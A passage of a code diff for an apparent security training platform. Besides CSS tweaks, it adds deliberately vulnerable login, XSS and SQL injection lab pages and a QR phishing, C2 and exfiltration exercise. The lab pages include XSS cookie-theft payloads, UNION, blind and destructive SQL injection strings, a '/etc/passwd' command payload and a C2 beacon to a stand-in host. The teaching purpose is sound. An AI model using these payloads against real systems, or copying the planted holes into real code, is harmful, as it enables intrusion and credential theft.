@@ -421,18 +421,24 @@ router.get("/api/campaigns/:campaignId/page/:nodeId?", async (req, res) => {
     }
     .campaign-header {
       border-bottom: 1px solid rgba(217,119,6,0.2);
-      padding: 1rem 2rem;
+      padding: 0.75rem 1rem;
       display: flex;
       justify-content: space-between;
       align-items: center;
       background: rgba(0,0,0,0.5);
+      gap: 0.5rem;
     }
-    .campaign-header h1 { color: var(--amber); font-size: 0.875rem; }
-    .campaign-header .meta { color: var(--muted); font-size: 0.7rem; }
+    .campaign-header h1 { color: var(--amber); font-size: 0.8rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .campaign-header .meta { color: var(--muted); font-size: 0.65rem; }
     .page-content {
       max-width: ${layout === 'full-page' ? '100%' : '800px'};
-      margin: ${layout === 'full-page' ? '0' : '2rem auto'};
-      padding: ${layout === 'full-page' ? '0' : '2rem'};
+      margin: ${layout === 'full-page' ? '0' : '1rem auto'};
+      padding: ${layout === 'full-page' ? '0' : '1rem'};
+    }
+    @media (min-width: 640px) {
+      .campaign-header { padding: 1rem 2rem; }
+      .campaign-header h1 { font-size: 0.875rem; }
+      .page-content { margin: ${layout === 'full-page' ? '0' : '2rem auto'}; padding: ${layout === 'full-page' ? '0' : '2rem'}; }
     }
     .page-content.layout-terminal {
       background: #000;
@@ -498,13 +504,16 @@ router.get("/api/campaigns/:campaignId/page/:nodeId?", async (req, res) => {
       display: flex;
       justify-content: space-between;
       align-items: center;
-      padding: 0.75rem 1rem;
+      padding: 1rem;
+      min-height: 56px;
       border: 1px solid rgba(217,119,6,0.2);
       border-radius: 6px;
       margin-bottom: 0.5rem;
       text-decoration: none;
       color: var(--fg);
       transition: all 0.2s;
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
     }
     .nav-link:hover {
       background: rgba(217,119,6,0.08);
@@ -841,6 +850,441 @@ const TEMPLATE_GENERATORS: Record<string, (topic: string, skill: string) => any>
         { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n6', hint: 'Final incident metrics logged to console', value: `[IR] Incident "${topic}" resolved. MTTD: 4h, MTTR: 6h, Impact: 3 systems, Data: 0 records exfiltrated` },
       ],
       tags: ['incident-response', 'defense', 'forensics', topic.toLowerCase()],
+    };
+  },
+
+  // ==================== REALISTIC WEB PAGE TEMPLATES ====================
+
+  vulnerable_login: (topic, skill) => {
+    const id = `tpl-${Date.now()}`;
+    const adminHash = Buffer.from(`admin:${topic}123!`).toString('base64');
+    return {
+      name: `Vulnerable Login: ${topic}`,
+      description: `A realistic corporate login page for ${topic} with multiple authentication vulnerabilities. Find credentials, bypass auth, and discover the admin panel.`,
+      category: 'exploit', difficulty: skill, estimatedTime: '25 min',
+      nodes: [
+        {
+          id: 'n1', type: 'step', title: 'Login Portal', x: 80, y: 150, width: 280, height: 140, color: 'amber',
+          pageLayout: 'full-page',
+          htmlContent: `
+<div style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#0f172a,#1e293b);font-family:system-ui,sans-serif">
+  <div style="width:100%;max-width:400px;padding:2rem">
+    <div style="text-align:center;margin-bottom:2rem">
+      <div style="width:64px;height:64px;background:#1e40af;border-radius:12px;margin:0 auto 1rem;display:flex;align-items:center;justify-content:center">
+        <span style="font-size:1.5rem;color:white">&#128274;</span>
+      </div>
+      <h1 style="color:white;font-size:1.5rem;margin:0">${topic} Portal</h1>
+      <p style="color:#94a3b8;font-size:0.875rem;margin-top:0.5rem">Secure Employee Access</p>
+    </div>
+    <form onsubmit="return false" style="background:#1e293b;padding:1.5rem;border-radius:12px;border:1px solid #334155">
+      <!-- TODO: Remove debug credentials before production -->
+      <div style="margin-bottom:1rem">
+        <label style="color:#94a3b8;font-size:0.75rem;display:block;margin-bottom:0.25rem">EMAIL</label>
+        <input type="email" placeholder="employee@${topic.toLowerCase().replace(/\\s/g,'')}.com" style="width:100%;padding:0.75rem;background:#0f172a;border:1px solid #334155;border-radius:8px;color:white;font-size:1rem;box-sizing:border-box" />
+      </div>
+      <div style="margin-bottom:1rem">
+        <label style="color:#94a3b8;font-size:0.75rem;display:block;margin-bottom:0.25rem">PASSWORD</label>
+        <input type="password" placeholder="Enter password" style="width:100%;padding:0.75rem;background:#0f172a;border:1px solid #334155;border-radius:8px;color:white;font-size:1rem;box-sizing:border-box" />
+      </div>
+      <input type="hidden" name="debug_token" value="${adminHash}" />
+      <input type="hidden" name="api_version" value="v2-legacy-NO-AUTH-CHECK" />
+      <button style="width:100%;padding:0.75rem;background:#2563eb;color:white;border:none;border-radius:8px;font-size:1rem;cursor:pointer;min-height:48px">Sign In</button>
+      <p style="color:#475569;font-size:0.7rem;text-align:center;margin-top:1rem">Forgot password? Contact IT: helpdesk@${topic.toLowerCase().replace(/\\s/g,'')}.com</p>
+    </form>
+    <p style="color:#334155;font-size:0.6rem;text-align:center;margin-top:2rem">Powered by ${topic} Auth v2.3.1-dev | Session: <span data-session-debug="true">${id}</span></p>
+  </div>
+</div>`,
+          content: `A realistic login page. Investigate the source code, hidden form fields, and embedded credentials.`,
+          metadata: { featureType: 'web', skillLevel: skill, toolsForStep: ['view-source', 'inspect-element', 'dev-tools'] }
+        },
+        { id: 'n2', type: 'tool', title: 'Source Code Analysis', content: `Examine the login page source code.\n\n1. View Page Source (Ctrl+U)\n2. Look for HTML comments\n3. Check hidden form fields\n4. Find hardcoded credentials\n5. Inspect meta tags for version info`, x: 420, y: 60, width: 260, height: 120, color: 'teal', metadata: { toolsForStep: ['view-source', 'inspect-element'] } },
+        { id: 'n3', type: 'tool', title: 'Authentication Bypass', content: `Test the auth mechanisms:\n\n- Try default credentials (admin/admin)\n- Check for SQL injection in login form\n- Look for API endpoints with no auth\n- Test the hidden debug token\n- Examine cookies after login attempt`, x: 420, y: 220, width: 260, height: 120, color: 'teal', metadata: { toolsForStep: ['burp-suite', 'curl', 'dev-tools'] } },
+        { id: 'n4', type: 'decision', title: 'What Did You Find?', content: `Select the vulnerability path:\n\n-> Hidden debug credentials in source\n-> SQL injection in login form\n-> Exposed API with no authentication\n-> Hardcoded session token`, x: 740, y: 140, width: 260, height: 130, color: 'purple' },
+        { id: 'n5', type: 'output', title: 'Access Achieved', content: `Document your findings:\n\n1. Vulnerability type and severity\n2. Steps to reproduce\n3. Impact assessment\n4. Recommended fix\n\nGenerate a QR code with the exploit payload to share with your team.`, x: 1060, y: 140, width: 260, height: 130, color: 'stone', metadata: { featureType: 'web' } },
+      ],
+      links: [
+        { id: 'l1', source: 'n1', target: 'n2', color: 'amber', label: 'Inspect source' },
+        { id: 'l2', source: 'n1', target: 'n3', color: 'amber', label: 'Test auth' },
+        { id: 'l3', source: 'n2', target: 'n4', color: 'teal' },
+        { id: 'l4', source: 'n3', target: 'n4', color: 'teal' },
+        { id: 'l5', source: 'n4', target: 'n5', color: 'purple' },
+      ],
+      rootNodes: ['n1'],
+      hiddenClues: [
+        { id: `clue-src-${id}`, type: 'source-code' as const, nodeId: 'n1', hint: 'View the page source - developers left a TODO comment with debug credentials', value: `<!-- TODO: Remove debug credentials before production -->` },
+        { id: `clue-data-${id}`, type: 'data-attribute' as const, nodeId: 'n1', hint: 'Inspect hidden form fields for auth bypass tokens', value: `debug_token:${adminHash} api_version:v2-legacy-NO-AUTH-CHECK` },
+        { id: `clue-meta-${id}`, type: 'meta-tag' as const, nodeId: 'n2', hint: 'The page footer leaks the server version', value: `${topic} Auth v2.3.1-dev` },
+        { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n5', hint: 'Check console for the session dump', value: `[AUTH-DEBUG] admin session: {user:"admin",role:"superadmin",token:"${adminHash}",mfa:false}` },
+      ],
+      tags: ['login', 'auth-bypass', 'web', 'credentials', topic.toLowerCase()],
+    };
+  },
+
+  xss_playground: (topic, skill) => {
+    const id = `tpl-${Date.now()}`;
+    return {
+      name: `XSS Lab: ${topic}`,
+      description: `A vulnerable web application for ${topic} with multiple Cross-Site Scripting vectors. Practice reflected, stored, and DOM-based XSS.`,
+      category: 'exploit', difficulty: skill, estimatedTime: '30 min',
+      nodes: [
+        {
+          id: 'n1', type: 'step', title: 'Search Page (Reflected XSS)', x: 80, y: 100, width: 300, height: 140, color: 'amber',
+          pageLayout: 'full-page',
+          htmlContent: `
+<div style="min-height:100vh;background:#f8fafc;font-family:system-ui,sans-serif">
+  <nav style="background:white;padding:1rem 2rem;border-bottom:1px solid #e2e8f0;display:flex;align-items:center;gap:1rem">
+    <span style="font-weight:bold;color:#1e293b;font-size:1.1rem">${topic} Search</span>
+    <span style="color:#94a3b8;font-size:0.8rem">Internal Knowledge Base</span>
+  </nav>
+  <div style="max-width:600px;margin:3rem auto;padding:0 1rem">
+    <h1 style="color:#1e293b;text-align:center;margin-bottom:2rem">Search ${topic} Docs</h1>
+    <form onsubmit="return false" style="display:flex;gap:0.5rem">
+      <input id="search-input" type="text" placeholder='Try: <script>alert("XSS")</script>' style="flex:1;padding:0.75rem;border:2px solid #e2e8f0;border-radius:8px;font-size:1rem;min-height:48px" />
+      <button onclick="document.getElementById('results').innerHTML='Results for: '+document.getElementById('search-input').value" style="padding:0.75rem 1.5rem;background:#2563eb;color:white;border:none;border-radius:8px;cursor:pointer;min-height:48px">Search</button>
+    </form>
+    <div id="results" style="margin-top:2rem;padding:1rem;background:white;border-radius:8px;border:1px solid #e2e8f0;color:#475569;min-height:60px">
+      <p style="color:#94a3b8;font-size:0.9rem">Enter a search term above. <strong>Notice how the input is reflected directly into the page...</strong></p>
+    </div>
+    <div style="margin-top:2rem;padding:1rem;background:#fffbeb;border:1px solid #fbbf24;border-radius:8px">
+      <p style="color:#92400e;font-size:0.8rem"><strong>Hint:</strong> The search results are rendered without sanitization. What happens if you search for HTML tags?</p>
+    </div>
+  </div>
+  <!-- Debug: user_input is reflected without encoding in /api/search?q=USER_INPUT -->
+</div>`,
+          content: 'A search page that reflects user input directly into the DOM without sanitization. Classic reflected XSS.',
+          metadata: { featureType: 'web', skillLevel: skill, toolsForStep: ['dev-tools', 'burp-suite'] }
+        },
+        {
+          id: 'n2', type: 'step', title: 'Comment Form (Stored XSS)', x: 80, y: 280, width: 300, height: 140, color: 'amber',
+          pageLayout: 'full-page',
+          htmlContent: `
+<div style="min-height:100vh;background:#f8fafc;font-family:system-ui,sans-serif;padding:2rem">
+  <div style="max-width:600px;margin:0 auto">
+    <h2 style="color:#1e293b">${topic} Feedback</h2>
+    <p style="color:#64748b;margin-bottom:1.5rem">Leave a comment for the ${topic} team. All feedback is displayed publicly below.</p>
+    <form onsubmit="return false">
+      <input type="text" placeholder="Your name" style="width:100%;padding:0.75rem;border:1px solid #e2e8f0;border-radius:8px;margin-bottom:0.5rem;font-size:1rem;box-sizing:border-box;min-height:48px" />
+      <textarea placeholder='Write your feedback... Try: <img src=x onerror="alert(document.cookie)">' style="width:100%;padding:0.75rem;border:1px solid #e2e8f0;border-radius:8px;height:100px;font-size:1rem;box-sizing:border-box;resize:vertical"></textarea>
+      <button style="margin-top:0.5rem;padding:0.75rem 2rem;background:#2563eb;color:white;border:none;border-radius:8px;cursor:pointer;min-height:48px">Submit</button>
+    </form>
+    <div style="margin-top:2rem;border-top:1px solid #e2e8f0;padding-top:1rem">
+      <h3 style="color:#1e293b;font-size:1rem">Recent Comments</h3>
+      <div style="padding:0.75rem;background:white;border:1px solid #e2e8f0;border-radius:8px;margin-top:0.5rem">
+        <strong style="color:#1e293b">Admin</strong> <span style="color:#94a3b8;font-size:0.75rem">2 hours ago</span>
+        <p style="color:#475569;margin-top:0.25rem">Great product! The team worked hard on ${topic}.</p>
+      </div>
+      <div style="padding:0.75rem;background:white;border:1px solid #e2e8f0;border-radius:8px;margin-top:0.5rem">
+        <strong style="color:#1e293b">DevOps</strong> <span style="color:#94a3b8;font-size:0.75rem">1 hour ago</span>
+        <p style="color:#475569;margin-top:0.25rem">Remember to sanitize inputs before v3 release!</p>
+      </div>
+    </div>
+  </div>
+</div>`,
+          content: 'A feedback form that stores and displays user input. Comments are rendered as raw HTML.',
+          metadata: { featureType: 'web', skillLevel: skill }
+        },
+        { id: 'n3', type: 'tool', title: 'Craft XSS Payloads', content: `Build your XSS payloads:\n\n**Reflected XSS:**\n- <script>alert('XSS')</script>\n- <img src=x onerror=alert(1)>\n- <svg onload=alert(document.domain)>\n\n**Stored XSS:**\n- <img src=x onerror="fetch('/api/exfil?c='+document.cookie)">\n\n**DOM-based:**\n- Check if URL params are used in innerHTML\n\n**QR Code tie-in:** Encode your XSS payload as a QR phish action and use the Agent Execute API to test it.`, x: 440, y: 180, width: 280, height: 160, color: 'teal', metadata: { toolsForStep: ['xss-payloads', 'burp-suite', 'qr-encoder'] } },
+        { id: 'n4', type: 'decision', title: 'Escalation Path', content: `What can you do with XSS?\n\n-> Session hijacking (steal cookies)\n-> Keylogging (capture credentials)\n-> Phishing (inject fake login form)\n-> Crypto mining (inject miner script)\n-> Worm (self-propagating stored XSS)\n\nUse the QR C2 system to encode an exfil payload that steals the session token.`, x: 780, y: 180, width: 260, height: 150, color: 'purple' },
+        { id: 'n5', type: 'output', title: 'XSS Report', content: `Document each XSS finding:\n\n1. Type: Reflected / Stored / DOM\n2. Payload used\n3. Impact (session theft, defacement, etc.)\n4. CVSS score\n5. Remediation: output encoding, CSP headers\n\nBonus: Generate a QR dropper containing a clue artifact as proof of exploitation.`, x: 1100, y: 180, width: 260, height: 130, color: 'stone' },
+      ],
+      links: [
+        { id: 'l1', source: 'n1', target: 'n3', color: 'amber', label: 'Reflected XSS' },
+        { id: 'l2', source: 'n2', target: 'n3', color: 'amber', label: 'Stored XSS' },
+        { id: 'l3', source: 'n3', target: 'n4', color: 'teal' },
+        { id: 'l4', source: 'n4', target: 'n5', color: 'purple' },
+      ],
+      rootNodes: ['n1', 'n2'],
+      hiddenClues: [
+        { id: `clue-src-${id}`, type: 'source-code' as const, nodeId: 'n1', hint: 'The source reveals the vulnerable API endpoint pattern', value: `<!-- Debug: user_input is reflected without encoding in /api/search?q=USER_INPUT -->` },
+        { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n3', hint: 'Console shows the session cookie that XSS could steal', value: `[SESSION] cookie=session_${topic.replace(/\s/g,'_')}_${id}; path=/; HttpOnly=FALSE` },
+        { id: `clue-net-${id}`, type: 'network-request' as const, nodeId: 'n4', hint: 'Network tab shows CSP header is missing', value: `Content-Security-Policy: NONE (vulnerable to inline script injection)` },
+        { id: `clue-data-${id}`, type: 'data-attribute' as const, nodeId: 'n2', hint: 'Form data attributes reveal the server-side rendering engine', value: `render-engine:ejs-unescaped template:<%- userInput %> (no sanitization)` },
+      ],
+      tags: ['xss', 'web', 'injection', 'client-side', topic.toLowerCase()],
+    };
+  },
+
+  sqli_database: (topic, skill) => {
+    const id = `tpl-${Date.now()}`;
+    const dbDump = Buffer.from(JSON.stringify({
+      tables: ['users', 'secrets', 'api_keys', 'sessions'],
+      users: [{id: 1, user: 'admin', pass_hash: '5f4dcc3b5aa765d61d8327deb882cf99', role: 'superadmin'}, {id: 2, user: 'guest', pass_hash: 'd41d8cd98f00b204e9800998ecf8427e', role: 'readonly'}],
+      flag: `FLAG{SQL_INJECTION_${topic.toUpperCase().replace(/\s/g,'_')}_PWNED}`
+    })).toString('base64');
+    return {
+      name: `SQL Injection: ${topic}`,
+      description: `A database-backed application for ${topic} with SQL injection vulnerabilities. Extract data from the backend database using UNION, blind, and error-based SQLi.`,
+      category: 'exploit', difficulty: skill, estimatedTime: '35 min',
+      nodes: [
+        {
+          id: 'n1', type: 'step', title: 'Product Lookup', x: 80, y: 150, width: 300, height: 140, color: 'amber',
+          pageLayout: 'full-page',
+          htmlContent: `
+<div style="min-height:100vh;background:#0f172a;font-family:'Courier New',monospace;color:#e2e8f0;padding:1rem">
+  <div style="max-width:700px;margin:0 auto">
+    <div style="background:#1e293b;padding:1.5rem;border-radius:8px;border:1px solid #334155;margin-bottom:1.5rem">
+      <h1 style="color:#38bdf8;margin:0 0 0.5rem">${topic} Database Query</h1>
+      <p style="color:#64748b;font-size:0.85rem;margin:0">Search the ${topic} inventory database</p>
+    </div>
+    <div style="background:#1e293b;padding:1.5rem;border-radius:8px;border:1px solid #334155">
+      <label style="color:#94a3b8;font-size:0.75rem;display:block;margin-bottom:0.5rem">PRODUCT ID</label>
+      <div style="display:flex;gap:0.5rem">
+        <input id="sqli-input" type="text" placeholder="Enter ID (try: 1 OR 1=1)" style="flex:1;padding:0.75rem;background:#0f172a;border:1px solid #334155;border-radius:6px;color:#38bdf8;font-family:monospace;font-size:1rem;min-height:48px;box-sizing:border-box" />
+        <button onclick="document.getElementById('sqli-output').textContent='SELECT * FROM products WHERE id = '+document.getElementById('sqli-input').value" style="padding:0.75rem 1.5rem;background:#2563eb;color:white;border:none;border-radius:6px;cursor:pointer;min-height:48px">Query</button>
+      </div>
+      <div style="margin-top:1rem;padding:1rem;background:#0f172a;border-radius:6px;border:1px solid #334155">
+        <p style="color:#475569;font-size:0.7rem;margin:0 0 0.5rem">GENERATED SQL:</p>
+        <code id="sqli-output" style="color:#fbbf24;font-size:0.9rem;word-break:break-all">SELECT * FROM products WHERE id = _</code>
+      </div>
+      <div style="margin-top:1rem;padding:0.75rem;background:#7f1d1d20;border:1px solid #991b1b40;border-radius:6px">
+        <p style="color:#fca5a5;font-size:0.8rem;margin:0"><strong>Vuln:</strong> User input is concatenated directly into the SQL query string. No parameterized queries.</p>
+      </div>
+    </div>
+    <div style="margin-top:1rem;padding:1rem;background:#1e293b;border-radius:8px;border:1px solid #334155">
+      <p style="color:#94a3b8;font-size:0.8rem;margin:0"><strong>Hint payloads to try:</strong></p>
+      <code style="color:#38bdf8;font-size:0.75rem;display:block;margin-top:0.5rem">1 UNION SELECT username,password,role FROM users--</code>
+      <code style="color:#38bdf8;font-size:0.75rem;display:block;margin-top:0.25rem">1 OR 1=1--</code>
+      <code style="color:#38bdf8;font-size:0.75rem;display:block;margin-top:0.25rem">1; DROP TABLE products--</code>
+    </div>
+  </div>
+  <!-- DB Schema: users(id,username,password_hash,role), secrets(id,key,value), api_keys(id,key,owner,scope) -->
+</div>`,
+          content: `A database query interface that concatenates user input directly into SQL. Classic injection point.`,
+          metadata: { featureType: 'web', skillLevel: skill, toolsForStep: ['sqlmap', 'burp-suite', 'manual-testing'] }
+        },
+        { id: 'n2', type: 'tool', title: 'UNION-Based Extraction', content: `Use UNION SELECT to extract data:\n\n1. Find column count: ORDER BY 1,2,3...\n2. Find display columns: UNION SELECT 1,2,3...\n3. Extract tables: UNION SELECT table_name FROM information_schema.tables\n4. Extract users: UNION SELECT username,password_hash FROM users\n5. Extract secrets: UNION SELECT key,value FROM secrets\n\nEncode findings as a QR exfil payload to "extract" the data.`, x: 440, y: 60, width: 280, height: 160, color: 'teal', metadata: { toolsForStep: ['sqlmap', 'manual-sqli'] } },
+        { id: 'n3', type: 'tool', title: 'Blind SQLi Techniques', content: `When output isn't visible, use blind techniques:\n\n**Boolean-based:**\n1 AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32\n\n**Time-based:**\n1; WAITFOR DELAY '0:0:5'--\n1 AND IF(1=1, SLEEP(5), 0)\n\n**Error-based:**\n1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))`, x: 440, y: 260, width: 280, height: 160, color: 'teal', metadata: { toolsForStep: ['sqlmap', 'burp-intruder'] } },
+        { id: 'n4', type: 'decision', title: 'Data Extracted', content: `What did you find in the database?\n\n-> Admin password hash (crack it)\n-> API keys with full scope\n-> Secret encryption keys\n-> Other users' session tokens\n\nUse the QR crypto challenge to crack the extracted hash.`, x: 780, y: 160, width: 260, height: 140, color: 'purple' },
+        { id: 'n5', type: 'output', title: 'SQLi Report', content: `Complete the SQLi assessment:\n\n1. Injection point and parameter\n2. SQL query reconstructed\n3. Data extracted (tables, rows)\n4. Impact: full database compromise\n5. Fix: parameterized queries, ORM, WAF\n\nThe extracted database dump is encoded in base64 in the page data.`, x: 1100, y: 160, width: 260, height: 130, color: 'stone' },
+      ],
+      links: [
+        { id: 'l1', source: 'n1', target: 'n2', color: 'amber', label: 'UNION injection' },
+        { id: 'l2', source: 'n1', target: 'n3', color: 'amber', label: 'Blind injection' },
+        { id: 'l3', source: 'n2', target: 'n4', color: 'teal' },
+        { id: 'l4', source: 'n3', target: 'n4', color: 'teal' },
+        { id: 'l5', source: 'n4', target: 'n5', color: 'purple' },
+      ],
+      rootNodes: ['n1'],
+      hiddenClues: [
+        { id: `clue-src-${id}`, type: 'source-code' as const, nodeId: 'n1', hint: 'The page source reveals the full database schema', value: `<!-- DB Schema: users(id,username,password_hash,role), secrets(id,key,value), api_keys(id,key,owner,scope) -->` },
+        { id: `clue-b64-${id}`, type: 'base64' as const, nodeId: 'n5', hint: 'The extracted database dump is base64 encoded in a data attribute', value: dbDump },
+        { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n4', hint: 'Console shows the cracked admin hash', value: `[CRACK] MD5 5f4dcc3b5aa765d61d8327deb882cf99 = "password" | Admin access confirmed for ${topic}` },
+        { id: `clue-hdr-${id}`, type: 'http-header' as const, nodeId: 'n2', hint: 'Response header reveals the database engine', value: `X-DB-Engine: MySQL 5.7.42 | X-ORM: none (raw query concatenation)` },
+      ],
+      tags: ['sqli', 'sql-injection', 'database', 'web', topic.toLowerCase()],
+    };
+  },
+
+  qr_attack_chain: (topic, skill) => {
+    const id = `tpl-${Date.now()}`;
+    return {
+      name: `QR Attack Chain: ${topic}`,
+      description: `A multi-stage attack using QR codes against ${topic}. Combine phishing, code execution, and data exfiltration through the QR C2 system.`,
+      category: 'exploit', difficulty: skill, estimatedTime: '40 min',
+      nodes: [
+        { id: 'n1', type: 'step', title: 'Reconnaissance', content: `**QR Attack: ${topic}**\n\nYou've identified QR codes in the ${topic} environment.\nYour mission: craft a multi-stage QR attack chain.\n\nPhase 1: Scan the legitimate QR to understand the expected format.\nUse the QR Signal Generator (QR button) to decode it.\n\nThe page source contains the original QR payload structure.`, x: 80, y: 200, width: 280, height: 150, color: 'amber', metadata: { featureType: 'qr', skillLevel: skill, toolsForStep: ['qr-decoder', 'view-source'] } },
+        { id: 'n2', type: 'tool', title: 'Craft Phishing QR', content: `Create a credential-harvesting QR code:\n\n1. Open the QR Signal Generator\n2. Select "Credential Harvest" preset\n3. Set redirect to a fake login page\n4. Set capture fields: username, password\n5. Generate and download the QR\n\nPayload: {"type":"phish","redirect":"/login","spoof":"${topic}","capture":["username","password"]}\n\nThis simulates placing a malicious QR sticker over a legitimate one.`, x: 420, y: 80, width: 280, height: 160, color: 'teal', metadata: { toolsForStep: ['qr-generator', 'phishing-kit'] } },
+        { id: 'n3', type: 'tool', title: 'Code Injection QR', content: `Craft a QR that executes commands when processed:\n\n1. Open QR Generator -> "Code Injection" preset\n2. Payload: {"type":"inject","payload":"cat /etc/passwd","shell":"bash","sandbox":true}\n3. Generate QR and use Agent Execute to test\n\nReal-world parallel: QR codes that auto-open URLs with JavaScript payloads, or configure WiFi to attacker-controlled networks.\n\nThe C2 tab shows how commands flow through QR encoding.`, x: 420, y: 280, width: 280, height: 160, color: 'teal', metadata: { toolsForStep: ['qr-generator', 'agent-execute', 'c2-panel'] } },
+        { id: 'n4', type: 'step', title: 'Establish C2 via QR', content: `Set up persistent access using QR-based C2:\n\n1. Go to QR modal -> C2 tab\n2. Select target machine\n3. Encode a beacon check-in command\n4. Simulate the target scanning and executing\n5. Observe the simulated response\n\nBeacon payload: {"type":"beacon","callback":"https://c2.internal","agentId":"QR-${topic}","interval":300}\n\nAll C2 traffic disguised as QR image downloads.`, x: 760, y: 180, width: 280, height: 150, color: 'amber', metadata: { featureType: 'agent', toolsForStep: ['c2-panel', 'qr-generator'] } },
+        { id: 'n5', type: 'tool', title: 'Exfiltrate via QR', content: `Extract data through the QR channel:\n\n1. QR Generator -> "Data Exfiltration" preset\n2. Select fields to exfil: token, clues, username\n3. Execute via Agent API\n4. Data is encoded and "transmitted" as QR\n\nReal-world: Attackers have used QR codes in screen flickers, printed documents, and even reflected laser patterns to exfiltrate data from air-gapped systems.`, x: 760, y: 380, width: 280, height: 150, color: 'teal', metadata: { toolsForStep: ['qr-generator', 'exfil-tools'] } },
+        { id: 'n6', type: 'output', title: 'Attack Chain Report', content: `Document the full QR attack chain:\n\n1. Initial access: Phishing QR overlay\n2. Credential harvest: Fake login portal\n3. Code execution: Injected commands via QR\n4. Persistence: C2 beacon via QR polling\n5. Exfiltration: Data encoded as QR images\n\nMitigations: QR scanning policies, URL verification, device management, network monitoring.\n\nGenerate a final QR dropper artifact as proof of the complete chain.`, x: 1100, y: 280, width: 280, height: 150, color: 'stone' },
+      ],
+      links: [
+        { id: 'l1', source: 'n1', target: 'n2', color: 'amber', label: 'Craft phishing QR' },
+        { id: 'l2', source: 'n1', target: 'n3', color: 'amber', label: 'Craft injection QR' },
+        { id: 'l3', source: 'n2', target: 'n4', color: 'teal', label: 'Credentials obtained' },
+        { id: 'l4', source: 'n3', target: 'n4', color: 'teal', label: 'Shell access' },
+        { id: 'l5', source: 'n4', target: 'n5', color: 'amber', label: 'C2 established' },
+        { id: 'l6', source: 'n5', target: 'n6', color: 'teal', label: 'Data exfiltrated' },
+      ],
+      rootNodes: ['n1'],
+      hiddenClues: [
+        { id: `clue-src-${id}`, type: 'source-code' as const, nodeId: 'n1', hint: 'Source contains the legitimate QR payload format used by the target', value: `<!-- Legitimate QR format: {"type":"session","data":{"action":"checkin","location":"lobby"},"timestamp":${Date.now()}} -->` },
+        { id: `clue-net-${id}`, type: 'network-request' as const, nodeId: 'n4', hint: 'Beacon response headers reveal the C2 protocol', value: `C2-Protocol: QR-over-HTTPS | Beacon-ID: QR-${topic}-${id.slice(-6)} | Next-Checkin: 300s` },
+        { id: `clue-con-${id}`, type: 'console-log' as const, nodeId: 'n5', hint: 'Console shows the exfiltrated data summary', value: `[EXFIL] QR C2 chain complete for ${topic}. Extracted: 3 credentials, 1 API key, session tokens. Total encoded in 4 QR frames.` },
+        { id: `clue-data-${id}`, type: 'data-attribute' as const, nodeId: 'n6', hint: 'The attack chain timeline is in element attributes', value: `attack-chain: recon:T-0, phish:T+5m, inject:T+12m, c2:T+15m, exfil:T+25m | target:${topic}` },
+      ],
+      tags: ['qr-attack', 'phishing', 'c2', 'exfiltration', 'multi-stage', topic.toLowerCase()],
+    };
+  },
+
+  investigation_board: (topic, skill) => {
+    const id = `tpl-${Date.now()}`;
+    return {
+      name: `Investigation: ${topic}`,
+      description: `A progressive investigation into ${topic} where each step adds to a living intelligence board. Findings accumulate across nodes and earlier analysis informs later decisions.`,
+      category: 'osint', difficulty: skill, estimatedTime: '45 min',
+      nodes: [
+        {
+          id: 'n1', type: 'step', title: 'Intel Board: Initial Briefing', x: 80, y: 200, width: 300, height: 150, color: 'amber',
+          pageLayout: 'dossier',
+          htmlContent: `
+<div style="font-family:monospace;color:#d6d3d1">
+  <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:1.5rem;border-bottom:2px solid #d97706;padding-bottom:0.75rem">
+    <h2 style="color:#d97706;margin:0">INVESTIGATION: ${topic.toUpperCase()}</h2>
+    <span style="color:#57534e;font-size:0.7rem">STATUS: ACTIVE | CLASSIFICATION: RESTRICTED</span>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem">
+    <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+      <h3 style="color:#d97706;font-size:0.85rem;margin:0 0 0.5rem">KNOWN FACTS</h3>
+      <ul style="color:#a8a29e;font-size:0.8rem;padding-left:1.2rem;margin:0">
+        <li>Target entity: ${topic}</li>
+        <li>First observed: [DATE UNKNOWN]</li>
+        <li>Threat level: Under assessment</li>
+      </ul>
+    </div>
+    <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+      <h3 style="color:#14b8a6;font-size:0.85rem;margin:0 0 0.5rem">WORKING HYPOTHESES</h3>
+      <ul style="color:#a8a29e;font-size:0.8rem;padding-left:1.2rem;margin:0">
+        <li style="color:#57534e">[No hypotheses yet - begin investigation]</li>
+      </ul>
+    </div>
+  </div>
+  <div style="margin-top:1rem;background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px">
+    <h3 style="color:#a78bfa;font-size:0.85rem;margin:0 0 0.5rem">EVIDENCE CHAIN</h3>
+    <p style="color:#57534e;font-size:0.8rem;margin:0">No evidence collected. Each investigative step below will add findings to this board.</p>
+  </div>
+  <div style="margin-top:1rem;padding:0.75rem;border:1px dashed #d97706;border-radius:4px;background:#d9770608">
+    <p style="color:#d97706;font-size:0.8rem;margin:0"><strong>Agent Note:</strong> This board updates as you progress. Return here after each step to see accumulated intelligence. The agent will analyze your findings and suggest next moves.</p>
+  </div>
+</div>`,
+          content: `The central intelligence board for your investigation into ${topic}. This board accumulates findings from every step.`,
+          metadata: { featureType: 'osint', skillLevel: skill }
+        },
+        {
+          id: 'n2', type: 'tool', title: 'Step 1: OSINT Collection', x: 440, y: 60, width: 260, height: 130, color: 'teal',
+          pageLayout: 'dossier',
+          htmlContent: `
+<div style="font-family:monospace;color:#d6d3d1">
+  <div style="border-bottom:1px solid #334155;padding-bottom:0.5rem;margin-bottom:1rem">
+    <span style="color:#14b8a6;font-size:0.7rem">STEP 1 OF 5</span>
+    <h2 style="color:#14b8a6;margin:0.25rem 0 0">OSINT Collection: ${topic}</h2>
+  </div>
+  <div style="background:#0a0a0a;padding:1rem;border:1px solid #292524;border-radius:4px;margin-bottom:1rem">
+    <p style="color:#a8a29e;font-size:0.85rem">Gather publicly available information about ${topic}. Use search engines, social media, public records, and domain tools.</p>
